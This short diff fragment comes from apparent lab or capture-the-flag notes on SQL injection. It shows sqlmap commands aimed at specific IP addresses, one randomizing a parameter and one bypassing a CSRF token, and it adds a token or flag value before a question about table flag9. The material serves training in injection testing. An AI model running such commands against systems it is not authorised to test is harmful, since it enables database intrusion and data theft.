@@ -177,7 +177,7 @@ sqlmap -u "http://165.22.126.213:32170/case8.php/?id=1&rp=29125" --randomize=rp 
 sqlmap -u "http://159.65.49.148:30071/case8.php?id=1" --data="id=1&csrf-token=enaUUhY2BFvZKWef2T9Pu6tFnfzde39JyiQvcLCDcU" --csrf-token="t0ken"
 <input type="hidden" name="t0ken" value="enaUUhY2BFvZKWef2T9Pu6tFnfzde39JyiQvcLCDcU">
 
-
+7F4DA0C0j5OW2hdOZ2ec65wGMFj0Qp0ub3pfpU0ZwQ
 
 
 What's the contents of table flag9? (Case #9)
